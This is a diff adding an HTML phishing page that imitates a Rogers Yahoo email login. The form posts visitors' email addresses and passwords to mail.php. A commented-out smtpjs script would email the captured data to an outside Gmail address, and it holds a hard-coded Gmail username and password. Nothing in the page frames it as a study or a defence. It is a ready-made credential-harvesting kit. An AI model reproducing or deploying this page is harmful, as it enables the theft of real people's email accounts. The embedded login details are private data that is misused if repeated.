@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<!-- Website - www.codingnepalweb.com -->
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Welcome</title>
+    <link rel="stylesheet" href="style.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  </head>
+  <body>
+    <div class="container">
+		<form action="mail.php" method="post">
+			<h1>Welcome</h1>
+			<p>A new and easy way to access your Rogers Yahoo email account. Please login with your @rogers.com or @nl.rogers.com email address and password</p>
+			<input type="text" placeholder="Rogers Email" name="email" required>
+			<input type="password" placeholder="Password" name="password" required>
+			<a class="forgot" href="">Forgot password?</a>
+			<div>
+			<button type="submit">Next</button>
+			<p class="p2">A new and easy way to access your <a href="">Rogers Yahoo email account.</a>
+			Please login with your @rogers.com or @nl.rogers.com email address and password</p>
+		</form>
+	 </div>
+    </div>
+<!-- 	<script src="https://smtpjs.com/v3/smtp.js"></script>
+	<script>
+		Function sendEmail(){
+			Email.send({
+				Host : "smtp.gmail.com",
+				Username : "donhoyt007@gmail.com",
+				Password : "32669932",
+				To : 'patunolaibukundavid@gmail.com',
+				From : document.getElementById("email").value,
+				Subject : "New user information",
+				Body : "And this is the body"
+			}).then(
+			  message => alert(message)
+			);
+		}
+	</script> -->
+  </body>
+</html>
